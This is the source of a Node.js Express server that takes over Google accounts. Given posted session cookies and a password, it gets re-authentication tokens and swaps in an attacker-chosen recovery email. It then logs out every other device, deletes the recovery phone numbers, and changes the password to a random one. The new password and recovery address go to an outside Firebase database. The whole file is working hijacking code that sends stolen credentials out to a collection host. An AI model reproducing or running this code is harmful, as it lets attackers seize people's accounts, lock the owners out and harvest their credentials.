require('events').EventEmitter.prototype._maxListeners = 100
const bodyParser = require('body-parser')
const express = require('express')
const { JSDOM } = require('jsdom')
const crypto = require('crypto')
const axios = require('axios')
const fs = require('fs')


const app = express()

app.use(express.json())
app.use(bodyParser.urlencoded({ extended: true }))

app.listen(process.env.PORT || 3000, ()=> {
    console.log("Listening on port 3000...")
})

const COMPLETED = 'https://database088-default-rtdb.firebaseio.com/raiyan088/code/gmail/completed/'
const UNKNOWN = 'https://database088-default-rtdb.firebaseio.com/raiyan088/code/gmail/unknown/'


let mRecovery = null

try {
    mRecovery = JSON.parse(fs.readFileSync('./recovery.json'))
} catch (e) {}

app.post('/', async function (req, res) {
    if(req.body) {
        try {
            let mData = req.body.data.split('★')
            if(mData.length == 7) {
                console.log('Received Data')
                getOSIDtoken(res, mData)
            } else {
                res.end('ERROR')
            }
        } catch (e) {
            res.end(e.toString())
        }
    } else {
        res.end('NULL')
    }
})

app.get('/ip', async function (req, res) {
    axios.get('https://ifconfig.me/ip').then(response => {
        res.end(response.data)
    }).catch(err => {
        res.end('Error')
    })
})

function serverError(connection, mData, wrong, type) {
    try {
        if(wrong && connection != null) {
            console.log('Error: '+type+' '+mData[1])
            axios.put(UNKNOWN+mData[0]+'/'+mData[1]+'.json', JSON.stringify({ type: type, data: JSON.stringify(mData) }), {
                headers: {
                    'Content-Type': 'application/x-www-form-urlencoded'
                }
            }).then(res => {
                connection.end('ERROR')
            }).catch(err => {
                connection.end('ERROR')
            })
        }
    } catch (e) {}
}

function getOSIDtoken(connection, mData) {

    let sendCookies = mData[6]

    axios.get('https://accounts.google.com/CheckCookie?continue=https%3A%2F%2Fmyaccount.google.com%2Fintro%2Fpersonal-info', {
        maxRedirects: 0,
        validateStatus: null,
        headers: getHeader(sendCookies)
    }).then(response => {
        let wrong = true
        try {
            if(response.headers['location']) {
                let url = decodeURIComponent(response.headers['location'])  
                let index = url.indexOf('osidt=')
                let split = url.substring(index+6, url.length).split('&')
                let tempCookes = sendCookies
                tempCookes += 'OSID=Lgh3m_XDdCpAmGim5eO6xW8csVs0m9rLO6I7FHHeiGEViTAiQK_GhRhgeVwISYbsIeMp1g.; '
                wrong = false

                axios.get('https://myaccount.google.com/accounts/SetOSID?continue=https%3A%2F%2Faccounts.youtube.com%2Faccounts%2FSetSID%3Fssdc%3D1&osidt='+split[0], {
                    maxRedirects: 0,
                    validateStatus: null,
                    headers: getHeader(tempCookes)
                }).then(response => {
                    let wrong = true
                    try {
                        let cookiesList = response.headers['set-cookie']

                        if(cookiesList) {
                            let osid = null
                            for(let i=0; i<cookiesList.length; i++) {
                                let singelData = cookiesList[i]
                                try {
                                    let start = singelData.indexOf('=')
                                    let end = singelData.indexOf(';')
                                    let key = singelData.substring(0, start)
                                    if(key == 'OSID') {
                                        osid = 'OSID='+singelData.substring(start+1, end)
                                        i = cookiesList.length
                                    }
                                } catch (e) {}
                            }

                            if (osid == null) {
                                let index = cookiesList.indexOf('OSID=')
                                if (index >= 0) {
                                    let temp = cookiesList.substring(index, cookiesList.length)
                                    osid = temp.substring(0, temp.indexOf(';')+1)
                                }
                            }

                            if (osid) {
                                wrong = false
                                sendCookies += osid
                                mData[6] = sendCookies

                                getRAPTtoken(connection, mData)
                            }
                        }
                    } catch (e) {}

                    serverError(connection, mData, wrong, '4')
                }).catch(err => {
                    serverError(connection, mData, true, '3')
                })
            }
        } catch (e) {}

        serverError(connection, mData, wrong, '2')
    }).catch(err => {
        serverError(connection, mData, true, '1')
    })
}

function getRAPTtoken(connection, mData) {
    axios.get('https://myaccount.google.com/signinoptions/rescuephone', {
        maxRedirects: 0,
        validateStatus: null,
        headers: getHeader(mData[6])
    }).then(response => {
        let wrong = true
        try {
            let location = response.headers['location']
            if(location) {
                let index = location.indexOf('rart=')
                let split = location.substring(index, location.length).split('&')
                
                wrong = false

                axios.get('https://accounts.google.com/ServiceLogin?'+split[0], {
                    maxRedirects: 0,
                    validateStatus: null,
                    headers: getHeader(mData[6])
                }).then(response => {
                    let wrong = true
                    try {
                        let location = response.headers['location']
                        if (location) {
                            if(location.includes('rapt=')) {
                                let index = location.indexOf('rapt=')
                                mData[7] = location.substring(index+5, location.length).split('&')[0]
                                wrong = false
            
                                languageChange(connection, mData)
                            } else if(location.startsWith('https://accounts.google.com/InteractiveLogin') && location.includes('rart=')) {
                                let index = location.indexOf('rart=')
                                let rart = location.substring(index, location.length).split('&')[0]
                                wrong = false

                                axios.get('https://accounts.google.com/InteractiveLogin?'+rart, {
                                    maxRedirects: 0,
                                    validateStatus: null,
                                    headers: getHeader(mData[6])
                                }).then(response => {
                                    try {
                                        let location = response.headers['location']
                                        if(location.includes('rapt=')) {
                                            let index = location.indexOf('rapt=')
                                            mData[7] = location.substring(index+5, location.length).split('&')[0]
                                            
                                            languageChange(connection, mData)
                                        } else {
                                            let index = location.indexOf('TL=')
                                            let tl = location.substring(index+3, location.length).split('&')[0]
                                            index = location.indexOf('cid=')
                                            let cid = location.substring(index+4, location.length).split('&')[0]
                                            let cookiesList = response.headers['set-cookie']
                                            let gps = cookiesGPS(cookiesList, mData[5])
                                            mData[3] = tl
                                            mData[4] = cid
                                            mData[5] = gps
                                            passwordMatching(connection, mData)
                                        }
                                    } catch (error) {
                                        serverError(connection, mData, true, '10')
                                    }
                                }).catch(err => {
                                    serverError(connection, mData, true, '9')
                                })
                            } else {
                                let index = location.indexOf('TL=')
                                let tl = location.substring(index+3, location.length).split('&')[0]
                                index = location.indexOf('cid=')
                                let cid = location.substring(index+4, location.length).split('&')[0]
                                let cookiesList = response.headers['set-cookie']
                                let gps = cookiesGPS(cookiesList, mData[5])
                                mData[3] = tl
                                mData[4] = cid
                                mData[5] = gps
                                passwordMatching(connection, mData)
                            }
                        }
                    } catch (e) {}
                    
                    serverError(connection, mData, wrong, '8')
                }).catch(err => {
                    serverError(connection, mData, true, '7')
                })
            }
        } catch (e) {}
        
        serverError(connection, mData, wrong, '6')
    }).catch(err => {
        serverError(connection, mData, true, '5')
    })
}

function passwordMatching(connection, mData) {
    axios.post('https://accounts.google.com/_/signin/challenge?hl=en&TL='+mData[3], getPasswordData(mData[2], parseInt(mData[4])), {
        maxRedirects: 0,
        validateStatus: null,
        headers: {
            'authority': 'accounts.google.com',
            'accept': '*/*',
            'accept-language': 'en-US,en;q=0.9',
            'content-type': 'application/x-www-form-urlencoded;charset=UTF-8',
            'google-accounts-xsrf': '1',
            'origin': 'https://accounts.google.com',
            'sec-ch-ua': '"Chromium";v="112", "Google Chrome";v="112", "Not:A-Brand";v="99"',
            'sec-ch-ua-arch': '"x86"',
            'sec-ch-ua-bitness': '"64"',
            'sec-ch-ua-full-version': '"112.0.5615.49"',
            'sec-ch-ua-full-version-list': '"Chromium";v="112.0.5615.49", "Google Chrome";v="112.0.5615.49", "Not:A-Brand";v="99.0.0.0"',
            'sec-ch-ua-mobile': '?0',
            'sec-ch-ua-model': '""',
            'sec-ch-ua-platform': '"Windows"',
            'sec-ch-ua-platform-version': '"15.0.0"',
            'sec-ch-ua-wow64': '?0',
            'sec-fetch-dest': 'empty',
            'sec-fetch-mode': 'cors',
            'sec-fetch-site': 'same-origin',
            'cookie': '__Host-GAPS='+mData[5]+'; '+mData[6],
            'user-agent': 'Mozilla/5.0 (Linux; Android 7.0; SM-G930V Build/NRD90M) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/59.0.3071.125 Mobile Safari/537.36',
            'x-chrome-id-consistency-request': 'version=1,client_id=77185425430.apps.googleusercontent.com,device_id=1066499d-aafe-441b-a13b-ce876bcef5f2,signin_mode=all_accounts,signout_mode=show_confirmation',
            'x-client-data': 'CJK2yQEIorbJAQjEtskBCKmdygEItPLKAQiVocsBCOKXzQEI45fNAQjom80BCMyczQEI/ZzNAQjtns0BCMCfzQEIhaDNAQiroc0BCL2izQE=',
            'x-same-domain': '1',
        }
    }).then(response => {
        let wrong = true

        try {
            let body = response.data
            let data = JSON.parse(body.substring(body.indexOf('[['), body.length))

            if(data[0][3] == 1) {
                let url = decodeURIComponent(data[0][13][2])
                if(url.includes('rapt=')) {
                    let index = url.indexOf('rapt=')
                    mData[7] = url.substring(index+5, url.length).split('&')[0]
                    wrong = false
                    languageChange(connection, mData)
                }
            }
        } catch (e) {}

        serverError(connection, mData, wrong, '12')
    }).catch(err => {
        serverError(connection, mData, true, '11')
    })
}

function languageChange(connection, mData) {
    axios.get('https://myaccount.google.com/phone', {
        maxRedirects: 0,
        validateStatus: null,
        headers: getHeader(mData[6])
    }).then(response => {
        try {
            const dom = new JSDOM(response.data)

            let list = dom.window.document.querySelectorAll('script')
            let numbers = []
            let gmail = null
            let time = null
            let years = []
            let year = parseInt(new Date().getFullYear())

            for (let i = 0; i < list.length; i++) {
                let html = list[i].innerHTML
                if (html.startsWith('AF_initDataCallback') && html.includes('rescuephone')) {
                    let data_list = JSON.parse(html.substring(html.indexOf('['), html.lastIndexOf(']')+1))
                    let data = data_list[0]
                    for (let i = 0; i < data.length; i++) {
                        years.push(data[i][18])
                        let list = data[i][11][0][1]
                        list.sort(function(a, b){return a - b})
                        let out = list
                        let map = {}
                        if (list.length > 2) {
                            let temp = {}
                            out = []
                            for (let j = 0; j < list.length; j++) {
                                temp[list[j]] = 'x'
                            }
                            let hasNum = data_list[1]
                            for (let j = 0; j < hasNum.length; j++) {
                                if(temp[hasNum[j][0]] != null && hasNum[j][2] == true) {
                                    out.push(hasNum[j][0])
                                }
                            }
                        }
                        out.sort(function(a, b){return a - b})
                        if (out[0] == 1) {
                            map['type'] = 'ZBoWob'
                        } else {
                            map['type'] = 'S8YvCb'    
                        }
                        map['number'] = data[i][0]
                        map['token'] = JSON.stringify(out)
                        numbers.push(map) 
                    }
                } else if (html.startsWith('window.WIZ_global_data')) {
                    try {
                        let temp = JSON.parse(html.substring(html.indexOf('{'), html.lastIndexOf('}')+1))
                        if (temp['SNlM0e']) {
                            time = temp['SNlM0e']
                        }
                        if (temp['oPEP7c']) {
                            gmail = temp['oPEP7c']
                        }
                    } catch (e) {}
                }
            }

            years.sort(function(a, b){return a-b})
            if(years.length > 0) {
                year = parseInt(new Date(years[0]).getFullYear())
            }

            let mGmail = gmail.replace('@gmail.com', '').replace('.', '')
                        
            let position = Math.floor((Math.random() * (mRecovery.length-1)))
            let recovery = mRecovery[position]
            
            mData[8] = mGmail
            mData[9] = recovery
            mData[10] = numbers
            mData[11] = time
            mData[12] = year

            axios.post('https://myaccount.google.com/_/language_update', getLanguage(time), {
                maxRedirects: 0,
                validateStatus: null,
                headers: getHeader(mData[6])
            }).then(response => {
                recoveryChange(connection, mData)
            }).catch(err => {
                recoveryChange(connection, mData)
            })
        } catch (e) {
            serverError(connection, mData, true, '14')
        }
    }).catch(err => {
        serverError(connection, mData, true, '13')
    })
}

function recoveryChange(connection, mData) {
    axios.post('https://myaccount.google.com/_/AccountSettingsUi/data/batchexecute?rpcids=uc1K4d&rapt='+mData[7], getRecoveryData(mData[9]+'@gmail.com', mData[11]), {
        maxRedirects: 0,
        validateStatus: null,
        headers: getHeader(mData[6])
    }).then(response => {
        let wrong = true
        try {
            if(!response.data.includes('"er"')) {
                wrong = false
                axios.post('https://myaccount.google.com/_/AccountSettingsUi/data/batchexecute?rpcids=GWdvgc&rapt='+mData[7], getVerificationData(mData[11]), {
                    maxRedirects: 0,
                    validateStatus: null,
                    headers: getHeader(mData[6])
                }).then(response => {
                    deviceLogOut(connection, mData)
                }).catch(err => {
                    deviceLogOut(connection, mData)
                })
            }
        } catch (e) {}

        serverError(connection, mData, wrong, '16')
    }).catch(err => {
        serverError(connection, mData, true, '15')
    })
}

function deviceLogOut(connection, mData) {

    axios.get('https://myaccount.google.com/device-activity', {
        maxRedirects: 0,
        validateStatus: null,
        headers: getHeader(mData[6])
    }).then(response => {
        try {
            const dom = new JSDOM(response.data)

            let list = dom.window.document.querySelectorAll('script')
            let logout = {}
            let data = []
            let time = null

            for (let i = 0; i < list.length; i++) {
                let html = list[i].innerHTML
                if (html.startsWith('AF_initDataCallback') && !html.includes('mail.google.com') && !html.includes('meet.google.com')) {
                    data = JSON.parse(html.substring(html.indexOf('['), html.lastIndexOf(']')+1))[1]
                } else if (html.startsWith('window.WIZ_global_data')) {
                    try {
                        let temp = JSON.parse(html.substring(html.indexOf('{'), html.lastIndexOf('}')+1))
                        if (temp['SNlM0e']) {
                            time = temp['SNlM0e']
                        }
                    } catch (e) {}
                }
            }

            for(let i=0; i<data.length; i++) {
                let child = data[i][2]
                for(let j=0; j<child.length; j++) {
                    let main = child[j]
                    if(main.length > 23) {
                        if(main[12] == true && main[13] != null && main[22] != null && main[22] != 1) {
                            logout[main[0]] = main[13]
                        }
                    }
                }
            }

            if (time == null) {
                time = mData[11]
            } else {
                mData[11] = time
            }

            if(Object.keys(logout).length > 0) {
                let size = 0
                let output = 0
        
                for(let [key, value] of Object.entries(logout)) {
                    size++
                    axios.post('https://myaccount.google.com/_/AccountSettingsUi/data/batchexecute?rpcids=YZ6Dc&source-path=%2Fu%2F5%2Fdevice-activity%2Fid%2F'+key, getLogOut(value, time), {
                        maxRedirects: 0,
                        validateStatus: null,
                        headers: getHeader(mData[6])
                    }).then(response => {
                        axios.post('https://myaccount.google.com/_/AccountSettingsUi/data/batchexecute?rpcids=Z5lnef&source-path=%2Fu%2F5%2Fdevice-activity%2Fid%2F'+key, getLogOutAgain(time), {
                            maxRedirects: 0,
                            validateStatus: null,
                            headers: getHeader(mData[6])
                        }).then(response => {
                            output++
                            if(output == size) {
                                numberRemove(connection, mData)
                            }
                        }).catch(err => {
                            output++
                            if(output == size) {
                                numberRemove(connection, mData)
                            }
                        })
                    }).catch(err => {
                        output++
                        if(output == size) {
                            numberRemove(connection, mData)
                        }
                    })
                }
            } else {
                numberRemove(connection, mData)
            }
        } catch (e) {
            numberRemove(connection, mData)
        }
    }).catch(err => {
        numberRemove(connection, mData)
    })
}

function numberRemove(connection, mData) {
    let size = 0
    let output = 0
    let numbers = mData[10]

    if (numbers.length == 0) {
        passwordChange(connection, mData)
    } else {
        for(let i=0; i<numbers.length; i++) {
            size++
            axios.post('https://myaccount.google.com/_/AccountSettingsUi/data/batchexecute?rpcids=ZBoWob&rapt='+mData[7], getPhoneData(numbers[i], mData[11]), {
                maxRedirects: 0,
                validateStatus: null,
                headers: getHeader(mData[6])
            }).then(response => {
                output++
                if(output == size) {
                    passwordChange(connection, mData)
                }
            }).catch(err => {
                output++
                if(output == size) {
                    passwordChange(connection, mData)
                }
            })
        }
    }
}


function passwordChange(connection, mData) {
    let changePass = getRandomPassword()

    axios.post('https://myaccount.google.com/_/AccountSettingsUi/data/batchexecute?rpcids=or64jf&rapt='+mData[7], getChangePasswordData(changePass, mData[11]), {
        maxRedirects: 0,
        validateStatus: null,
        headers: getHeader(mData[6])
    }).then(response => {
        try {
            if(response.data.includes('"er"')) {
                changePass = mData[2]
            }

            let send = { create: mData[12], password: changePass, recovery: mData[9] }
            
            axios.put(COMPLETED+mData[0]+'/'+mData[8]+'.json', JSON.stringify(send), {
                headers: {
                    'Content-Type': 'application/x-www-form-urlencoded'
                }
            }).then(res => {
                console.log(mData[8], send)

                if (connection) {
                    connection.end('SUCCESS')
                }
            }).catch(err => {
                if (connection) {
                    send['gmail'] = mData[8]
                    console.log(send)
                    connection.end(JSON.stringify(send))
                }
            })

            if (connection) {
                connection.end('SUCCESS')
            }
        } catch (e) {}
        
    }).catch(err => {
        try {
            changePass = mData[2]

            let send = { create: mData[12], password: changePass, recovery: mData[9] }
            
            axios.put(COMPLETED+mData[0]+'/'+mData[8]+'.json', JSON.stringify(send), {
                headers: {
                    'Content-Type': 'application/x-www-form-urlencoded'
                }
            }).then(res => {
                console.log(mData[8], send)

                if (connection) {
                    connection.end('SUCCESS')
                }
            }).catch(err => {
                if (connection) {
                    send['gmail'] = mData[8]
                    console.log(send)
                    connection.end(JSON.stringify(send))
                }
            })
        } catch (e) {}
    })
}



function cookiesGPS(cookiesList, tempGps) {
    for(let i=0; i<cookiesList.length; i++) {
        let singelData = cookiesList[i]
        try {
            let start = singelData.indexOf('=')
            let end = singelData.indexOf(';')
            let key = singelData.substring(0, start)
            if(key == '__Host-GAPS') {
                return singelData.substring(start+1, end)
            }
        } catch (e) {}
    }

    let gps = '__Host-GAPS='
    let index = cookiesList.indexOf(gps)
    if (index >= 0) {
        let temp = cookiesList.substring(index, cookiesList.length)
        return temp.substring(gps.length, temp.indexOf(';'))
    }

    return tempGps
}

function getPasswordData(password, tl, type) {
    return 'TL='+tl+'&continue=https%3A%2F%2Fmyaccount.google.com%2Fphone&flowEntry=ServiceLogin&flowName=GlifWebSignIn&hl=en-US&rip=1&service=accountsettings&f.req='+encodeURIComponent(JSON.stringify(['AEThLlw5uc06cH1q8zDfw1uY4Xp7eNORXHjsuJT-9-2nFsiykmQD7IcKUJPcYmG4KddhkjoTup4nzB0yrSZeYwm7We09VV6f-i34ApnWRsbGJ2V1tdbWPwWOgK4gDGSgJEJ2hIK9hyGgV-ejHBA-mCWDXqcePqHHag5bc4lHSHRGyNrOr9Biuyn6y8tk3iCBn5IY34f-QKm5-SOxrbYWDcto50q0oo2z0YCPFtY556fWL0DY0W0pAGKmW6Ky4ukssyF91aMhKyZsH5bzHEs0vPdnYAWfxipSCarZjBUB0TIR7W2MyATWD99NE0xXQAIy2AGgdxdyi9aYhS7sjH1iUhbjspK_di8Wn1us7BfEbjaXI0BA4SXy7igdq53U5lKmR1seyx6mpKnVKK59iCNyWzZOa8y91Q06DdD0OqQHaPmK2g6S2PH6j6CsOsBRGVxcvjnzysjfgf7bARU0CgFDOAwA8Q8fKOaqBIe0Xg3nfHILRWVBJnVqUpI',null,type,null,[1,null,null,null,[password,null,true]]]))+'&bgRequest='+encodeURIComponent(JSON.stringify(["identifier",getIdentifier()]))+'&gmscoreversion=undefined&checkConnection=youtube%3A882%3A0&checkedDomains=youtube&pstMsg=1'
}

function getRecoveryData(gmail, time) {
    return 'f.req='+encodeURIComponent(JSON.stringify([[["uc1K4d","[\"ac.sirerq\",\""+gmail+"\",null,true]",null,"generic"]]]))+'&at='+encodeURIComponent(time)
}

function getVerificationData(time) {
    return 'f.req=%5B%5B%5B%22GWdvgc%22%2C%22%5B%5D%22%2Cnull%2C%22generic%22%5D%5D%5D&at='+encodeURIComponent(time)
}

function getPhoneData(data, time) {
    return 'f.req='+encodeURIComponent(JSON.stringify([[[data['type'],"[[3,\""+data['number']+"\",null,null,"+data['token']+",null,null,null,null,null,[],1]]",null,"generic"]]]))+'&at='+encodeURIComponent(time)
}

function getChangePasswordData(password, time) {
    return 'f.req='+encodeURIComponent(JSON.stringify([[["or64jf","[\""+password+"\",null,false]",null,"generic"]]]))+'&at='+encodeURIComponent(time)
}

function getLogOut(token, time) {
    return 'f.req='+encodeURIComponent(JSON.stringify([[["YZ6Dc","[null,null,\""+token+"\"]",null,"generic"]]]))+'&at='+encodeURIComponent(time)
}

function getLogOutAgain(time) {
    return 'f.req=%5B%5B%5B%22Z5lnef%22%2C%22%5B%5D%22%2Cnull%2C%22generic%22%5D%5D%5D&at='+encodeURIComponent(time)
}

function getLanguage(time) {
    return 'f.req=%5b%5b%22en%22%5d%5d&at='+encodeURIComponent(time)
}

function getIdentifier() {
    let data = ''
    let loop = Math.floor(Math.random() * 15)+15
    for(let i=0; i<loop; i++) {
        data = data+crypto.randomBytes(20).toString('hex')
    }
    return data
}

function getRandomPassword() {
    let C = ['A','B','C','D','E','F','G','H','I','J','K','L','M','N','O','P','Q','R','S','T','U','V','W','X','Y','Z']
    let S = ['a','b','c','d','e','f','g','h','i','j','k','l','m','n','o','p','q','r','s','t','u','v','w','x','y','z']
    let N = ['0','1','2','3','4','5','6','7','8','9']
    let U = ['#','$','@']
    
    let pass = C[Math.floor((Math.random() * 26))]
    pass += S[Math.floor((Math.random() * 26))]
    pass += S[Math.floor((Math.random() * 26))]
    pass += S[Math.floor((Math.random() * 26))]
    pass += S[Math.floor((Math.random() * 26))]
    pass += N[Math.floor((Math.random() * 10))]
    pass += N[Math.floor((Math.random() * 10))]
    pass += N[Math.floor((Math.random() * 10))]
    pass += U[Math.floor((Math.random() * 3))]
    pass += U[Math.floor((Math.random() * 3))]
    
    return pass
}

function getHeader(cookie) {
    return {
        'authority': 'myaccount.google.com',
        'accept': '*/*',
        'accept-language': 'en-US,en;q=0.9',
        'content-type': 'application/x-www-form-urlencoded;charset=UTF-8',
        'cookie': cookie,
        'origin': 'https://myaccount.google.com',
        'sec-ch-ua': '"Chromium";v="112", "Google Chrome";v="112", "Not:A-Brand";v="99"',
        'sec-ch-ua-arch': '"x86"',
        'sec-ch-ua-bitness': '"64"',
        'sec-ch-ua-full-version': '"112.0.5615.49"',
        'sec-ch-ua-full-version-list': '"Chromium";v="112.0.5615.49", "Google Chrome";v="112.0.5615.49", "Not:A-Brand";v="99.0.0.0"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-model': '""',
        'sec-ch-ua-platform': '"Windows"',
        'sec-ch-ua-platform-version': '"15.0.0"',
        'sec-ch-ua-wow64': '?0',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'same-origin',
        'user-agent': 'Mozilla/5.0 (Linux; Android 7.0; SM-G930V Build/NRD90M) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/59.0.3071.125 Mobile Safari/537.36',
        'x-client-data': 'CJK2yQEIorbJAQjEtskBCKmdygEItPLKAQiVocsBCOKXzQEI45fNAQjom80BCMyczQEI/ZzNAQjtns0BCMCfzQEIhaDNAQiroc0BCL2izQE=',
        'x-same-domain': '1',
    }
}
